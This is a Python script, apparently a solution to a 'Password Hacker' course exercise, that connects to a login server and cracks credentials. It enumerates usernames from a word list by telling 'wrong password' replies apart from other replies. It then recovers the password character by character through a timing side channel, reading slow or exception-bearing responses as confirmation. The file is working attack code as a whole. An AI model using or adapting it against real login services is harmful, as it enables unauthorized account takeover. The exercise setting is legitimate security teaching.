import itertools
import json
import socket
import sys
import time

ip_address = sys.argv[1]
port = sys.argv[2]


# message_send = sys.argv[3]


def logins(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            yield line.strip()


def json_generator(login, password):
    return json.dumps({"login": login, "password": password})


def json_receiver(answer):
    answer_decoded = answer.decode()
    return dict(json.loads(answer_decoded))


def find_login():
    admin_login = ''
    found_result = False
    for admin_login in logins(
            "C:\\Users\\n.matveev\\PycharmProjects\\Password Hacker with Python\\Password Hacker with Python\\task\\hacking\\logins.txt"):
        if found_result:
            break
        data_info = json_generator(admin_login, "123").encode()
        client_socket.send(data_info)
        response_from_server = client_socket.recv(1024)
        answer_from_server = json_receiver(response_from_server)
        for log, passw in answer_from_server.items():
            if passw == "Wrong password!":
                return admin_login


address = (ip_address, int(port))
client_socket = socket.socket()
client_socket.connect(address)

server_response = ''

login = find_login()

found = False
letters_nums = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
current_password = ''
true_password = ''

for n in range(10000):
    if found:
        break
    for combination in itertools.product(letters_nums, repeat=1):
        next_char = ''.join(combination)
        current_password = true_password + next_char
        data = json_generator(login, current_password).encode()
        client_socket.send(data)
        start_time = time.perf_counter()
        response = client_socket.recv(1024)
        end_time = time.perf_counter()
        answer = json_receiver(response)
        key, value = answer.popitem()
        server_response = value
        if value == "Connection success!":
            print(json_generator(login, current_password))
            client_socket.close()
            found = True
            break
        elif value == "Exception happened during login" or end_time - start_time >= 0.1:
            true_password += next_char
            break
